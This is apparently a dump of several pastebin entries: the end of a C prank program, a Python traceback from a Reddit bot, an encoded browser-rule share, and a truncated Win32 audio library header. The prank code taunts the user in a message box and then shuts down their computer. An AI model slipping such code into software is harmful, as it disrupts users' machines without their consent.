  MessageBoxA(NULL,""LOL I'm going to turn your computer off now"",""lol dummy"",MB_ICONINFORMATION);
  return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR args, int nCmdShow){
  kit_audioSpec spec;
  spec.callback=callback;
  spec.buffer_len=4096;
  spec.frequency=11025;
  spec.channels=1;
  spec.format=KIT_AUDIO_FMT_U8;

  int returnStatus;
  kit_audioDevice* device=kit_audioWaveOutOpen(&spec,-1,&returnStatus);
  if(!device){ printf(""returnStatus=%i\n"",returnStatus); return 0; }

  kit_audioWaveOutPlay(device,1);
  HANDLE threadHandle=CreateThread(NULL,0,msgboxthread,NULL,0,NULL);
  CloseHandle(threadHandle);
  #define waitms 8000
  Sleep(waitms);
  if(!shutdownComputer()){
    printf(""shutdown error=%lu\n"",GetLastError());
  }
  Sleep(60000-waitms);
  //you'd then close the device (if only waveOutReset worked...)
  return 0;
}"
W1jY4i0s,ServerError: received 504 HTTP response,Vault-TecTradingCo,Python,Thursday 29th of June 2023 08:24:34 PM CDT,"Traceback (most recent call last):
  File ""/root/Fallout76MarketplaceKarmaTransferBot/main.py"", line 258, in main
    for comment in comment_stream:
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/util.py"", line 195, in stream_generator
    for item in reversed(list(function(limit=limit, **function_kwargs))):
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 63, in __next__
    self._next_batch()
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = self._reddit.get(self.url, params=self.params)
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 634, in get
    return self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 739, in _objectify_request
    self.request(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 941, in request
    return self._core.request(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 330, in request
    return self._request_with_retries(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 253, in _request_with_retries
    return self._do_retry(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 162, in _do_retry
    return self._request_with_retries(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 253, in _request_with_retries
    return self._do_retry(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 162, in _do_retry
    return self._request_with_retries(
  File ""/root/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 266, in _request_with_retries
    raise self.STATUS_EXCEPTIONS[response.status_code](response)
prawcore.exceptions.ServerError: received 504 HTTP response
"
TXkD4npU,邀您一起看：Free Chat - chat.6.bnu120.space https://chat.6.bnu120.space/,xiaomianao666,JavaScript,Thursday 29th of June 2023 08:17:31 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥Free Chat - chat.6.bnu120.space https://chat.6.bnu120.space/@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIlg1XCIsXCJwYXRoXCI6XCJ4NVwiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXCJ1XFxcIikpO1xcbmxldCBqcyA9ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICB0cnkge1xcbiAgICAgICAgaWYgKGRvY3VtZW50LnRpdGxlICYmIGRvY3VtZW50LnRpdGxlLmxlbmd0aCkge1xcbiAgICAgICAgICAgIGxldCByID0gJCQkKCkubGF6eVJ1bGUoKHQpID0+IHtcXG4gICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKHQpO1xcbiAgICAgICAgICAgIH0sIGRvY3VtZW50LnRpdGxlICsgXFxcIiBcXFwiICsgbG9jYXRpb24uaHJlZik7XFxuICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5wYXJzZUxhenlSdWxlKHIpO1xcbiAgICAgICAgfVxcbiAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICBmeV9icmlkZ2VfYXBwLmxvZyhlLnRvU3RyaW5nKCkpO1xcbiAgICB9XFxufSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCJcXFwiLFxcbiAgICB1cmw6IHVybCxcXG4gICAgY29sX3R5cGU6IFxcXCJ4NV93ZWJ2aWV3X3NpbmdsZVxcXCIsXFxuICAgIGRlc2M6IFxcXCJmbG9hdCYmMTAwJVxcXCIsXFxuICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAganM6IGpzLFxcbiAgICAgICAgLy9mbG9hdFZpZGVvOiB0cnVlLFxcbiAgICAgICAgY2FuQmFjazogdHJ1ZSxcXG4gICAgICAgIGJsb2NrUnVsZXM6IFtcXFwiLmdpZlxcXCIsIFxcXCIvYWQvXFxcIiwgXFxcImdvb2dsZVxcXCIsIFxcXCIvc2gvdG8vXFxcIiwgXFxcIi5HSUZcXFwiXVxcbiAgICB9XFxufSk7XFxuc2V0UmVzdWx0KGQpO1wifV0sXCJzYXZlZFwiOmZhbHNlLFwidGl0bGVcIjpcIkdQVOWkp+WFqFwiLFwidmVyc2lvblwiOjAsXCJ1cmxcIjpcImhpa2VyOi8vcGFnZS94NT9ydWxlPUdQVOWkp+WFqCZ1PWFIUjBjSE02THk5cGJtUmxlQzVqYUdGMExtSnVkVEV5TUM1emNHRmpaUzg9XCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczpcXG52YXIgZCA9IFtdO1xcbmxldCB1cmwgPSBiYXNlNjREZWNvZGUoZ2V0UGFyYW0oXFxcInVcXFwiKSk7XFxubGV0IGpzID0gJC50b1N0cmluZygoKSA9PiB7XFxuICAgIHRyeSB7XFxuICAgICAgICBpZiAoZG9jdW1lbnQudGl0bGUgJiYgZG9jdW1lbnQudGl0bGUubGVuZ3RoKSB7XFxuICAgICAgICAgICAgbGV0IHIgPSAkJCQoKS5sYXp5UnVsZSgodCkgPT4ge1xcbiAgICAgICAgICAgICAgICBzZXRQYWdlVGl0bGUodCk7XFxuICAgICAgICAgICAgfSwgZG9jdW1lbnQudGl0bGUgKyBcXFwiIFxcXCIgKyBsb2NhdGlvbi5ocmVmKTtcXG4gICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBhcnNlTGF6eVJ1bGUocik7XFxuICAgICAgICB9XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKGUudG9TdHJpbmcoKSk7XFxuICAgIH1cXG59KTtcXG5kLnB1c2goe1xcbiAgICB0aXRsZTogXFxcIlxcXCIsXFxuICAgIHVybDogdXJsLFxcbiAgICBjb2xfdHlwZTogXFxcIng1X3dlYnZpZXdfc2luZ2xlXFxcIixcXG4gICAgZGVzYzogXFxcImZsb2F0JiYxMDAlXFxcIixcXG4gICAgcGljX3VybDogXFxcIlxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICBqczoganMsXFxuICAgICAgICAvL2Zsb2F0VmlkZW86IHRydWUsXFxuICAgICAgICBjYW5CYWNrOiB0cnVlLFxcbiAgICAgICAgYmxvY2tSdWxlczogW1xcXCIuZ2lmXFxcIiwgXFxcIi9hZC9cXFwiLCBcXFwiZ29vZ2xlXFxcIiwgXFxcIi9zaC90by9cXFwiLCBcXFwiLkdJRlxcXCJdXFxuICAgIH1cXG59KTtcXG5zZXRSZXN1bHQoZCk7XCIsXCJncm91cFwiOlwi5YW25a6DXCIsXCJ1YVwiOlwibW9iaWxlXCIsXCJwcmVSdWxlXCI6XCJcIixcInBhZ2VzXCI6XCJbe1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwiWDVcXFwiLFxcXCJwYXRoXFxcIjpcXFwieDVcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG52YXIgZCA9IFtdO1xcXFxubGV0IHVybCA9IGJhc2U2NERlY29kZShnZXRQYXJhbShcXFxcXFxcInVcXFxcXFxcIikpO1xcXFxubGV0IGpzID0gJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgdHJ5IHtcXFxcbiAgICAgICAgaWYgKGRvY3VtZW50LnRpdGxlICYmIGRvY3VtZW50LnRpdGxlLmxlbmd0aCkge1xcXFxuICAgICAgICAgICAgbGV0IHIgPSAkJCQoKS5sYXp5UnVsZSgodCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIHNldFBhZ2VUaXRsZSh0KTtcXFxcbiAgICAgICAgICAgIH0sIGRvY3VtZW50LnRpdGxlICsgXFxcXFxcXCIgXFxcXFxcXCIgKyBsb2NhdGlvbi5ocmVmKTtcXFxcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAucGFyc2VMYXp5UnVsZShyKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgZnlfYnJpZGdlX2FwcC5sb2coZS50b1N0cmluZygpKTtcXFxcbiAgICB9XFxcXG59KTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgdXJsOiB1cmwsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwieDVfd2Vidmlld19zaW5nbGVcXFxcXFxcIixcXFxcbiAgICBkZXNjOiBcXFxcXFxcImZsb2F0JiYxMDAlXFxcXFxcXCIsXFxcXG4gICAgcGljX3VybDogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBqczoganMsXFxcXG4gICAgICAgIC8vZmxvYXRWaWRlbzogdHJ1ZSxcXFxcbiAgICAgICAgY2FuQmFjazogdHJ1ZSxcXFxcbiAgICAgICAgYmxvY2tSdWxlczogW1xcXFxcXFwiLmdpZlxcXFxcXFwiLCBcXFxcXFxcIi9hZC9cXFxcXFxcIiwgXFxcXFxcXCJnb29nbGVcXFxcXFxcIiwgXFxcXFxcXCIvc2gvdG8vXFxcXFxcXCIsIFxcXFxcXFwiLkdJRlxcXFxcXFwiXVxcXFxuICAgIH1cXFxcbn0pO1xcXFxuc2V0UmVzdWx0KGQpO1xcXCJ9XVwiLFwicHJveHlcIjpcIlwifSIsInRpdGxlIjoiRnJlZSBDaGF0IC0gY2hhdC42LmJudTEyMC5zcGFjZSBodHRwczovL2NoYXQuNi5ibnUxMjAuc3BhY2UvIn0=
KvJfAfXU,kit_w32_audio.h with winmm,Kitomas,C,Thursday 29th of June 2023 08:16:15 PM CDT,"//(compile with kernel32, ole32, and optionally winmm (define ""KIT_AUDIO_USE_WINMM"" to use waveIn/Out functionality)
/**
 * \file kit_w32_audio.h
 * \brief Header file for KIT Win32's audio module
 */
//uncomment this if compiling kit_w32_audio.a, and want to use winmm
#ifndef KIT_AUDIO_USE_WINMM
#  define KIT_AUDIO_USE_WINMM
#endif

#ifndef _KIT_W32_AUDIO_H
#define _KIT_W32_AUDIO_H
#  ifndef _KIT_AUDIO
#  define _KIT_AUDIO



/* GENERAL */
#include <stdint.h>
#include <string.h>
#include <windef.h>
//(requires that winmm was linked when kit_w32_audio.a was compiled)
#ifdef KIT_AUDIO_USE_WINMM
#  include <mmsystem.h>
#endif
//WAVEFORMATEXTENSIBLE lives in mmreg.h, but i don't want
 //to also include wingdi.h here just for BITMAPINFOHEADER
 //TBD: check if mmreg.h is deprecated like winmm, as i'm pretty sure they're related
#ifndef NOBITMAP
#  define NOBITMAP
#  include <mmreg.h>
#  undef NOBITMAP
#else
#  include <mmreg.h>
#endif
//this provides CRITICAL_SECTION, which is a type of mutex object iirc
#include <synchapi.h>
//used for creating and managing threads
#include <processthreadsapi.h>
#include <combaseapi.h>
#define _kit_audioMalloc(_type,_len) CoTaskMemAlloc(sizeof(_type)*(_len))
#define _kit_audioFree(_ptr) CoTaskMemFree(_ptr)
#define _kit_audioRealloc(_ptr,_type,_len) CoTaskMemRealloc(_ptr,sizeof(_type)*(_len))


/**
 * \name Audio Format Constants
 */
/** @{ */
#define KIT_AUDIO_FMT_I8  (0x8007) ///< \brief signed  8-bit samples
#define KIT_AUDIO_FMT_U8  (0x0007) ///< \brief unsigned  8-bit samples

#define KIT_AUDIO_FMT_I16LSB (0x800F) ///< \brief   signed 16-bit samples (little endian)
#define KIT_AUDIO_FMT_U16LSB (0x000F) ///< \brief unsigned 16-bit samples (little endian)
#define KIT_AUDIO_FMT_I32LSB (0x801F) ///< \brief   signed 32-bit samples (little endian)
#define KIT_AUDIO_FMT_U32LSB (0x001F) ///< \brief unsigned 32-bit samples (little endian)
#define KIT_AUDIO_FMT_F32LSB (0x811F) ///< \brief 32-bit float samples (little endian)
#define KIT_AUDIO_FMT_F64LSB (0x813F) ///< \brief 64-bit float samples (little endian)

#define KIT_AUDIO_FMT_I16MSB (0x900F) ///< \brief   signed 16-bit samples (big endian)
#define KIT_AUDIO_FMT_U16MSB (0x100F) ///< \brief unsigned 16-bit samples (big endian)
#define KIT_AUDIO_FMT_I32MSB (0x901F) ///< \brief   signed 32-bit samples (big endian)
#define KIT_AUDIO_FMT_U32MSB (0x101F) ///< \brief unsigned 32-bit samples (big endian)
#define KIT_AUDIO_FMT_F32MSB (0x911F) ///< \brief 32-bit float samples (big endian)
#define KIT_AUDIO_FMT_F64MSB (0x913F) ///< \brief 64-bit float samples (big endian)

#define KIT_AUDIO_FMT_I16 KIT_AUDIO_FMT_I16LSB
#define KIT_AUDIO_FMT_U16 KIT_AUDIO_FMT_U16LSB
#define KIT_AUDIO_FMT_I32 KIT_AUDIO_FMT_I32LSB
#define KIT_AUDIO_FMT_U32 KIT_AUDIO_FMT_U32LSB
#define KIT_AUDIO_FMT_F32 KIT_AUDIO_FMT_F32LSB
#define KIT_AUDIO_FMT_F64 KIT_AUDIO_FMT_F64LSB
/** @} */


/**
 * \name Audio Format Bitmasks & Macros
 */
/** @{ */ /* (the ""M"" in FMT_M means (bit)mask) */
#define KIT_AUDIO_FMT_MBITSIZE (0x00FF)
#define KIT_AUDIO_FMT_MFLOAT   (0x0100)
#define KIT_AUDIO_FMT_MENDIAN  (0X1000)
#define KIT_AUDIO_FMT_MSIGNED  (0x8000)
#define KIT_AUDIO_FMT_BITSIZE(x)        ((x) & KIT_AUDIO_FMT_MBITSIZE)
#define KIT_AUDIO_FMT_ISFLOAT(x)        ((x) & KIT_AUDIO_FMT_MFLOAT)
#define KIT_AUDIO_FMT_ISBIGENDIAN(x)    ((x) & KIT_AUDIO_FMT_MENDIAN)
#define KIT_AUDIO_FMT_ISSIGNED(x)       ((x) & KIT_AUDIO_FMT_MSIGNED)
#define KIT_AUDIO_FMT_ISINT(x)          (!KIT_AUDIO_FMT_ISFLOAT(x))
#define KIT_AUDIO_FMT_ISLITTLEENDIAN(x) (!KIT_AUDIO_FMT_ISBIGENDIAN(x))
#define KIT_AUDIO_FMT_ISUNSIGNED(x)     (!KIT_AUDIO_FMT_ISSIGNED(x))
/** @} */


/**
 * \name Audio Device Type Constants
 */
/** @{ */
#define _KIT_AUDIO_DEVTYPE_BASE                               0
#define KIT_AUDIO_DEVTYPE_WASAPIIN  (_KIT_AUDIO_DEVTYPE_BASE+1)
#define KIT_AUDIO_DEVTYPE_WASAPIOUT (_KIT_AUDIO_DEVTYPE_BASE+2)
#define KIT_AUDIO_DEVTYPE_WAVEIN    (_KIT_AUDIO_DEVTYPE_BASE+3)
#define KIT_AUDIO_DEVTYPE_WAVEOUT   (_KIT_AUDIO_DEVTYPE_BASE+4)
/** @} */


/**
 * \name Audio Device Type Macros
 */
/** @{ */
#define KIT_AUDIO_IFNOTDEVICE(_device)\
  if(_device               == NULL                  || \
     _device->_magic.num   != 0x007665446F69647561     \
  )
#define KIT_AUDIO_IFDEVICEINVALID(_device,_type)\
  if(_device               == NULL                  || \
     _device->_magic.num   != 0x007665446F69647561  || \
     _device->_device_type != _type                    \
  )
#define KIT_AUDIO_AUDITANDLOCK(_device,_type,_errorvalue)\
  if(!kit_audioLockDevice(_device)  || \
     _device->device_type != _type    \
  ) return _errorvalue;
#define KIT_AUDIO_LOCK(_device) \
  EnterCriticalSection(&_device->_mutex);
//assumes audit already happened
#define KIT_AUDIO_UNLOCK(_device) \
  LeaveCriticalSection(&_device->_mutex);
#define _KIT_AUDIO_LOCKCALLBACKTHREAD(_device) \
  EnterCriticalSection(&_device->_callback_mutex);
#define _KIT_AUDIO_UNLOCKCALLBACKTHREAD(_device) \
  LeaveCriticalSection(&_device->_callback_mutex);
/** @} */


/**
 * Audio Format (FMT)
 * \verbatim
   Bit Layout is as follows:

   +----------------------sample is signed if set
   |
   |        +----------sample is bigendian if set
   |        |
   |        |           +--sample is float if set
   |        |           |
   |        |           |  +-sample bit size (-1)+
   |        |           |  |                     |
   15 14 13 12 11 10 09 08 07 06 05 04 03 02 01 00
   \endverbatim
 */
typedef uint16_t kit_audioFormat;


/**
 * PCM Audio Callback
 * This type of function is called when an opened (and unpaused)
 * audio device's audio buffer needs more PCM data.
 * The given audio buffer must be completely filled before returning
 * \param userdata A user-defined pointer passed to the callback, which
 *                 is stored in the same kit_audioSpec as the callback itself
 * \param stream   A pointer to the audio data buffer
 * \param len      The length of that buffer in bytes
 */
typedef void (*kit_audioCallback) (void* userdata,  void* stream, unsigned int len);


/**
 * \brief This is the struct for an audio specification (something like a config but for a kit_audioDevice)
 */
typedef struct {
  kit_audioCallback callback; ///< \brief Called when the audio buffer needs to be refilled
  void*             userdata; ///< \brief User-defined pointer passed to callback
  uint32_t         frequency; ///< \brief Sample rate of audio in Hz
  uint32_t       buffer_size; ///< \brief Audio buffer length in bytes (automatically calculated)
  uint16_t        buffer_len; ///< \brief Audio buffer length in samples (must a be power of 2)
  uint16_t          channels; ///< \brief Number of audio channels (1=mono, 2=stereo, etc.)
  kit_audioFormat     format; ///< \brief Audio data format information
  uint16_t          _padding; //hopefully this works as intended
} kit_audioSpec;


/**
 * \brief This is the struct used for both WASAPI in/out and waveIn/Out devices. \n
 * Something of note is that most members of this struct have the ""_"" prefix,
 * which states that they are private and most likely should not be interacted
 * with or modified unless through kit_audio's interface.
 *
 * (While this struct uses an ID in the form of _magic, this type of ID
 * is not present in every kind of 'kit_moduleName' struct.)
 */
typedef struct {
  union {
    char               str[8]; ///< \brief String portion of ID (""audioDev\x00"")
    uint64_t              num; ///< \brief Number portion of ID (0x007665446F69647561)
  } /* -------------- */ _magic; ///< \brief Struct ID number; union of uint64_t and char[8]
  WAVEFORMATEXTENSIBLE    _info; ///< \brief Used for some internal Win32 interactions
  #ifdef KIT_AUDIO_USE_WINMM
  WAVEHDR       _buffer_info[2]; ///< \brief Information related to output streams
  #endif
  CRITICAL_SECTION       _mutex; ///< \brief Used to stop callback from triggering if kit_audioLockDevice is called
  CRITICAL_SECTION _callback_mutex; ///< \brief Used to lock access to _callback_thread specifically
  kit_audioSpec             src; ///< \brief Audio format of input stream buffer
  kit_audioSpec             cvt; ///< \brief Audio format of ConVerTed (output) stream
  union {
    HANDLE            _handle; ///< \brief Pointer handle of the device
    #ifdef KIT_AUDIO_USE_WINMM
    HWAVEIN    _handle_waveIn;
    HWAVEOUT  _handle_waveOut;
    #endif
  };
  HANDLE       _callback_thread; ///< \brief User-defined callback thread, which kit_audioWaveOutReset locks until completion for
  void*              _buffer[2]; ///< \brief Output streams (while 0 is playing, 1 is being filled, and vice versa)
  void*                 _stream; ///< \brief Points to the input stream data that is passed to _src.callback
  float*                 volume; ///< \brief Volume multiplier for each audio channel (0.0 -> 1.0)
  uint32_t     callback_timeout; ///< \brief Timeout for callback thread, in milliseconds (default of 10000)
  uint16_t               status; ///< \brief Gives some info of the device's state
  uint8_t              _playing; ///< \brief A boolean of whether the device is unpaused or not
  uint8_t           _cvt_needed; ///< \brief A boolean of 'is format conversion needed?'
  uint8_t           device_type; ///< \brief 1, 2, 3, 4  =  WASAPI in, WASAPI out, waveIn, waveOut
  uint8_t                _which; ///< \brief Which output stream to fill with more audio data
  uint16_t             _padding;
  union {
    #ifdef KIT_AUDIO_USE_WINMM
    WAVEINCAPS    _waveInCaps; ///< \brief Capabilities of a waveIn device
    WAVEOUTCAPS  _waveOutCaps; ///< \brief Capabilities of a waveOut device
    #endif
  }; /* --------------------- */ ///< \brief Capability specifications of a device
} kit_audioDevice;


/**
 * \brief Lock the audio callback of a given device from being called
 *        (useful for manipulating the device struct)
 *
 * \param device A pointer to the device
 * \return A boolean of if the given pointer is an actual audio device
 *
 * \remark This activates a CRITICAL_SECTION mutex, so unlock as soon as possible
 */
static inline int kit_audioLockDevice(kit_audioDevice* device){
  KIT_AUDIO_IFNOTDEVICE(device) return 0;
  else { EnterCriticalSection(&device->_mutex); return 1; }
}


/**
 * \brief Unlock the audio callback of a given device
 *
 * \param device A pointer to the device
 * \return A boolean of if the given pointer is an actual audio device
 */
static inline int kit_audioUnlockDevice(kit_audioDevice* device){
  KIT_AUDIO_IFNOTDEVICE(device) return 0;
  else { LeaveCriticalSection(&device->_mutex); return 1; }
}


/**
 * \brief Get the current playing state of a given device
 *
 * \param device A pointer to the device
 * \return A boolean value of whether the device is currently unpaused or not
 */
static inline int kit_audioIsPlaying(kit_audioDevice* device){
  if(!kit_audioLockDevice(device)) return 0;
  int isPlaying=device->_playing;
  KIT_AUDIO_UNLOCK(device);
  return isPlaying;
}


/**
 * \brief Set a device channel's volume multiplier (values should be 0.0 -> 1.0)
 *
 * \param device A pointer to the device
 * \param volume New volume multiplier for selected channel
 * \param channel Channel to assign new multiplier to
 */
static inline void kit_audioSetVolume(kit_audioDevice* device, float volume,uint32_t channel){
  if(!kit_audioLockDevice(device)) return;
  if(channel>=device->cvt.channels) return;
  device->volume[channel]=volume;
  KIT_AUDIO_UNLOCK(device);
}


/**
 * \brief Set Stereo volume multiplier for device (values should be 0.0 -> 1.0)
 *
 * \param device A pointer to the device
 * \param volL New volume multiplier for left channel (or just channel 0 if channels is equal to 1)
 * \param volR New volume multiplier for right channel (ignored if channels is <2)
 */
static inline void kit_audioSetVolumeLR(kit_audioDevice* device, float volL,float volR){
  if(!kit_audioLockDevice(device)) return;
  device->volume[0]=volL;
  if(device->cvt.channels>1) device->volume[1]=volR;
  KIT_AUDIO_UNLOCK(device);
}



/* WASAPI */
/*//link against kernel32 and ole32
#include <initguid.h>
#include <mmdeviceapi.h>
#include <audioclient.h>
*/



/* WINMM */
#ifdef KIT_AUDIO_USE_WINMM


//thread process that handles filling waveOut audio buffers
extern DWORD WINAPI _kit_audioWaveOutFillBuffer(LPVOID device_void_ptr);


//callback associated with a waveOut device
extern void CALLBACK _kit_audioWaveOutProc(HWAVEOUT waveOutHandle, UINT message, DWORD_PTR instance,
                                           DWORD_PTR param1, DWORD_PTR param2);


//(remember to turn on static member extraction in doxygen config!)
/**
 * \brief Get the current number of waveOut devices
 *
 * \return The number of available waveOut devices, or NULL on error \n
 *         A value of 0 either means none are present, or an error occurred
 */
static inline uint32_t kit_audioWaveOutGetNumDevs(){
  return (uint32_t)waveOutGetNumDevs();
}


/**
 * \brief Play/Pause a given waveOut device
 *
 * \param device A pointer to the device
 * \param playState A boolean of whether to resume playing or pause the device
 * \return Result of either waveOutRestart/waveOutPause (depending on if playState == 1 or not) \n
 *         Possible return values:
 * \verbatim
   ""MMSYSERR_NOERROR"": No error occurred; success!
   ""MMSYSERR_INVALHANDLE"": Specified device handle is invalid
   ""MMSYSERR_NODRIVER"": No device driver is present
   ""MMSYSERR_NOMEM"": Unable to allocate or lock memory.
   ""MMSYSERR_NOTSUPPORTED"": Specified device is synchronous and does not support pausing
   \endverbatim
 * (MMSYSERR_INVALHANDLE can also be returned if ""device"" is not a waveOut device)
 */
extern uint32_t kit_audioWaveOutPlay(kit_audioDevice* device, int playState);


//threading can be a pain, so this is on the backburner for now
/* *
 * \brief Stop playback of waveOut device, before setting current position to zero. \n
 *        (This will immediately call the device's kit_audioCallback to initialize the buffer again!)
 * \remark If the kit_audioCallback is already running, the thread calling kit_audioWaveOutReset
 *         will lock until the callback has completed
 *
 * \param device A pointer to the device
 * \return result of waveOutReset, or MMSYSERR_INVALHANDLE if ""device"" is not a waveOut device \n
 *         Possible return values:
 * \verbatim
   ""MMSYSERR_NOERROR"": No error occurred; success!
   ""MMSYSERR_INVALHANDLE"": Specified device handle is invalid
   ""MMSYSERR_NODRIVER"": No device driver is present
   ""MMSYSERR_NOMEM"": Unable to allocate or lock memory.
   ""MMSYSERR_NOTSUPPORTED"": Specified device is synchronous and does not support pausing
   \endverbatim
 */
//extern uint32_t kit_audioWaveOutReset(kit_audioDevice* device);//, uint32_t timeoutMilliseconds);
/*
 * \param timeoutMilliseconds Maximum wait time for callback thread to end. \n
 *        -1 (or ""INFINITE"") to wait indefinitely, and 0 to use device's timeout (10000 by default)
*/


/**
 * \brief Open a waveOut device (device will be paused initially)
 *
 * \param desiredSpec The desired kit_audioSpec of the audio stream
 * \param deviceID The ID number of the desired waveOut device (-1 to select default device)
 * \param returnStatus A pointer to an int to be filled with a status code (ignored unless function returns NULL) \n
 *        Possible returnStatus codes (all but 0 is considered an error):
 * \verbatim
    0: Device opened successfully; no error
    1: CoTaskMemAlloc (equivalent to malloc) of device returned NULL
    2: Callback in desiredSpec was NULL
    3: Bad device ID (ID specified was out of range)
    4: No device driver is present
    5: Unable to allocate or lock memory while fetching device capabilities
    6: Format of device capabilities empty for some reason (this shouldn't happen)
    7: desiredSpec->buffer_len is equal to 0
    8: desiredSpec->buffer_len is not a power of 2
    9: desiredSpec->frequency (sample rate) is neither 11025, 22050, 44100, nor 96000
   10: desiredSpec->channels is neither 1 nor 2
   11: desiredSpec->format is neither U8 (unsigned 8-bit), I16 (signed 16-bit), nor F32 (32-bit float)
   12: Device is incapable of 11.025kHz, mono, signed 8-bit
   13: Device is incapable of 11.025kHz, mono, signed 16-bit
   14: Device is incapable of 11.025kHz, stereo, signed 8-bit
   15: Device is incapable of 11.025kHz, stereo, signed 16-bit
   16: Device is incapable of 22.05kHz, mono, signed 8-bit
   17: Device is incapable of 22.05kHz, mono, signed 16-bit
   18: Device is incapable of 22.05kHz, stereo, signed 8-bit
   19: Device is incapable of 22.05kHz, stereo, signed 16-bit
   20: Device is incapable of 44.1kHz, mono, signed 8-bit
   21: Device is incapable of 44.1kHz, mono, signed 16-bit
   22: Device is incapable of 44.1kHz, stereo, signed 8-bit
   23: Device is incapable of 44.1kHz, stereo, signed 16-bit
   24: Device is incapable of 96kHz, mono, signed 8-bit
   25: Device is incapable of 96kHz, mono, signed 16-bit
   26: Device is incapable of 96kHz, stereo, signed 8-bit
   27: Device is incapable of 96kHz, stereo, signed 16-bit
   28: CoTaskMemAlloc of device->_stream returned NULL
   29: CoTaskMemAlloc of device->_buffer0 returned NULL
   30: CoTaskMemAlloc of device->_buffer1 returned NULL
   31: CoTaskMemAlloc of device->_volume returned NULL
   32: waveOutOpen returned error 'Specified resource is already allocated'
   33: waveOutOpen returned error 'No device driver is present'
   34: waveOutOpen returned error 'Unable to allocate or lock memory'
   35: waveOutOpen returned error 'Attempted to open with an unsupported waveform-audio format'
   36: waveOutOpen returned error 'Device is synchronous, but WAVE_ALLOWSYNC flag was not set'
   \endverbatim
 * \return A pointer to a kit_audioDevice struct, otherwise return NULL on failure
 *
 * \remark Audio might begin stuttering if the audio stream buffer is set too small. \n
 *         For example, audio at 96kHz might stutter with a buffer size of 4096, but 8192 or 16384 should be safe usually.
 *
 * \sa kit_audioWaveOutGetNumDevs
 * \sa kit_audioWaveOutPlay
 */
extern kit_audioDevice* kit_audioWaveOutOpen(kit_audioSpec* desiredSpec, uint32_t deviceID, int* returnStatus_ptr);


/* *
 * \brief Close a waveOut device
 *
 * \param device_p A pointer to the device's pointer
 * \return 0 on success, positive value on failure. \n
 *         Possible return codes:
 * \verbatim
   0: Device closed successfully; no error
   1: device_p is NULL
   2: *device_p is invalid (pointer is either NULL, or just not a waveOut audioDevice)
